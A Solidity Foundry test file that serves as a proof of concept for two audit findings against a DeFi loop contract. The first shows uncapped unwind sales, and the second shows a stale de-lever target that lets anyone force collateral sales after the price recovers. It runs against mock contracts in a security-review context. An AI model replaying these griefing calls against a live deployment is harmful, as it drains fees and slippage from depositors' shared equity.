// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {SubLoop} from "../src/SubLoop.sol";
import {DcaDispatch} from "../src/lib/DcaDispatch.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockPool} from "./mocks/MockPool.sol";
import {MockDispatch} from "./mocks/MockDispatch.sol";

/// @notice PoC for the two forced-selling findings in `propeller-how-it-works.md`:
///
///         (a) "an unwind sale is not capped by the amount still owed"
///             (SubLoop.sol:378-414) — the debt-bearing `pokeRepay` path caps a
///             sale by HF headroom, tranche and aPRIME balance, but NOT by the
///             remaining `unwindTargetEquity`. When only a few dollars of unwind
///             target remain, anyone can force a FULL tranche through the pool:
///             ~20x more collateral is sold than needed, the loop pays swap fees
///             / slippage on all of it, and the excess sits as idle HOLLAR.
///
///         (b) "a recovered health factor does not cancel a stale de-lever
///             target" (SubLoop.sol:287-288, 554-568) — `deleverDebtTarget` can
///             increase but is never reduced or cleared when HF recovers. A
///             transient price dip (or oracle wobble) lets anyone latch a large
///             target via `deLever()`; after the price recovers the loop is
///             healthy, yet permissionless callers keep forcing sales until the
///             obsolete target is fully repaid — and `pokeBorrow` stays blocked
///             the whole time, so the ramp cannot resume.
///
///         Both are grief/efficiency losses, not direct theft: every forced
///         sale leaks the swap fee (modelled here at 1% via MockDispatch) and
///         real slippage out of shared loop equity, and (b) additionally
///         freezes all lever-ups for the duration.
contract UnwindAbusePocTest is Test {
    MockERC20 hollar;
    MockERC20 prime;
    MockERC20 aPrime;
    MockERC20 primeDebt;
    MockERC20 hollarDebt;
    MockERC20 aHollar;
    MockPool pool;
    SubLoop loop;

    uint256 constant SEED = 1_000e18;
    uint256 constant TARGET_HF = 1.05e18;
    uint16 constant FEE_BPS = 100; // 1% swap fee — makes forced selling measurable

    function setUp() public {
        hollar = new MockERC20("HOLLAR", "HOLLAR", 18);
        prime = new MockERC20("PRIME", "PRIME", 6);
        aPrime = new MockERC20("aPRIME", "aPRIME", 6);
        primeDebt = new MockERC20("debtPRIME", "dPRIME", 6);
        hollarDebt = new MockERC20("debtHOLLAR", "dHOLLAR", 18);
        aHollar = new MockERC20("aHOLLAR", "aHOLLAR", 18);

        pool = new MockPool();
        pool.initReserve(address(prime), address(aPrime), address(primeDebt), 8800, 8500, 6, 1e18);
        pool.initReserve(address(hollar), address(aHollar), address(hollarDebt), 0, 0, 18, 1e18);

        SubLoop impl = new SubLoop();
        bytes memory init = abi.encodeCall(
            SubLoop.initialize,
            (address(pool), address(hollar), address(prime), address(aPrime), TARGET_HF, 1.10e18, address(this))
        );
        loop = SubLoop(address(new ERC1967Proxy(address(impl), init)));

        vm.etch(DcaDispatch.DISPATCH, address(new MockDispatch()).code);
        MockDispatch(payable(DcaDispatch.DISPATCH)).configure(address(pool), address(hollar), address(prime), 222, 1043);
        MockDispatch(payable(DcaDispatch.DISPATCH)).setFeeBps(FEE_BPS);
        loop.configureDca(222, 43, 1043, 143, 10_000);

        loop.registerVault(address(this));
        loop.setTranches(10_000_000e18, 100e6); // unwind tranche: 100 aPRIME per pokeRepay
    }

    function _ramp() internal {
        hollar.mint(address(this), SEED);
        hollar.approve(address(loop), SEED);
        loop.deposit(SEED);
        for (uint256 i = 0; i < 40; i++) {
            loop.pokeBorrow();
        }
    }

    /// ── (a) one permissionless call force-sells ~20x the remaining unwind ──
    function test_poc_unwindSaleNotCappedByAmountOwed() public {
        _ramp();

        // unwind request worth ~$5 of equity (1/200 of the ~$1000 position)
        uint256 shares = loop.sharesOf(address(this)) / 200;
        loop.requestUnwind(shares);
        uint256 target = loop.unwindTargetEquity();
        emit log_named_decimal_uint("remaining unwind target (HOLLAR)", target, 18);

        // fair need: freeing `target` via the proportional split
        // (freed ~= 16.2% of each sale) requires selling ~= target / 0.162
        uint256 fairSaleUsd8 = (target / 1e10) * 1000 / 162;
        uint256 apBefore = aPrime.balanceOf(address(loop));
        uint256 equityBefore = loop.totalEquity();

        // ONE permissionless pokeRepay — no unwind-target cap on the sale
        loop.pokeRepay();

        uint256 sold6 = apBefore - aPrime.balanceOf(address(loop));
        uint256 soldUsd8 = sold6 * 1e2; // 6dp PRIME @ $1 → 8dp USD
        emit log_named_decimal_uint("sold in one forced tranche (USD)", soldUsd8, 8);
        emit log_named_decimal_uint("a target-capped sale would be (USD)", fairSaleUsd8, 8);

        assertEq(sold6, 100e6, "full 100-aPRIME tranche sold");
        assertGt(soldUsd8, 3 * fairSaleUsd8, "sold >3x what the remaining target needed");        assertEq(loop.unwindTargetEquity(), 0, "target overshot to zero in one tranche");

        // the excess proceeds are credited to NOBODY: idle HOLLAR in the loop
        uint256 idle = hollar.balanceOf(address(loop)) - loop.reservedFreed();
        emit log_named_decimal_uint("idle HOLLAR left by the overshoot", idle, 18);
        assertGt(idle, 5e18, "excess sale proceeds sit idle");

        // and the loop paid the swap fee on the WHOLE tranche, not the needed
        // slice: ~$1 of equity destroyed vs ~$0.31 a capped sale would pay
        uint256 equityLoss = equityBefore - loop.totalEquity();
        uint256 feeOnFairSale = (fairSaleUsd8 * FEE_BPS) / 10_000;
        emit log_named_decimal_uint("equity lost (USD, incl. legit payout)", equityLoss, 8);
        assertGt(equityLoss, target / 1e10 + 2 * feeOnFairSale, "fee paid on the overshoot, not just the need");
    }

    /// ── (b) a recovered HF does not cancel the stale de-lever target ──────
    function test_poc_staleDeleverTargetForcesSalesAfterRecovery() public {
        _ramp();

        // transient dip: PRIME -2% → HF ~1.029, below target → anyone latches
        // a de-lever target
        pool.setPrice(address(prime), 0.98e18);
        assertLt(loop.healthFactor(), TARGET_HF, "dip: HF below target");
        loop.deLever();
        uint256 latched = loop.deleverDebtTarget();
        assertGt(latched, 0, "de-lever target latched during the dip");
        emit log_named_decimal_uint("latched de-lever target (HOLLAR)", latched, 18);

        // recovery: PRIME back to $1 → HF back at target, loop healthy again
        pool.setPrice(address(prime), 1e18);
        assertGe(loop.healthFactor(), TARGET_HF, "recovered: HF back at target");
        vm.expectRevert(SubLoop.HealthyEnough.selector);
        loop.deLever(); // correctly refuses to re-size — but never CLEARS either
        assertEq(loop.deleverDebtTarget(), latched, "STALE: target survives the recovery");

        // while the stale target stands, the ramp is frozen...
        uint256 debtBefore = hollarDebt.balanceOf(address(loop));
        loop.pokeBorrow();
        assertEq(hollarDebt.balanceOf(address(loop)), debtBefore, "pokeBorrow blocked by the stale target");

        // ...and anyone can keep forcing sales the healthy loop does not need
        uint256 apBefore = aPrime.balanceOf(address(loop));
        uint256 equityBefore = loop.totalEquity();
        for (uint256 i = 0; i < 3; i++) {
            loop.pokeRepay();
            assertGe(loop.healthFactor(), TARGET_HF, "loop was healthy throughout the forced sales");
        }
        uint256 forcedSold = apBefore - aPrime.balanceOf(address(loop));
        emit log_named_decimal_uint("aPRIME force-sold while healthy", forcedSold, 6);
        emit log_named_decimal_uint("stale target remaining", loop.deleverDebtTarget(), 18);

        assertEq(forcedSold, 3 * 100e6, "three full tranches sold against a healthy loop");
        assertLt(loop.deleverDebtTarget(), latched, "sales drain the obsolete target, slowly");
        // each forced sale leaks the swap fee out of shared equity:
        // 3 tranches x $100 x 1% ≈ $3 destroyed for zero benefit
        uint256 equityLoss = equityBefore - loop.totalEquity();
        emit log_named_decimal_uint("equity destroyed by forced sales (USD)", equityLoss, 8);
        assertGt(equityLoss, 2e8, "fees leaked on sales the loop never needed");
    }
}
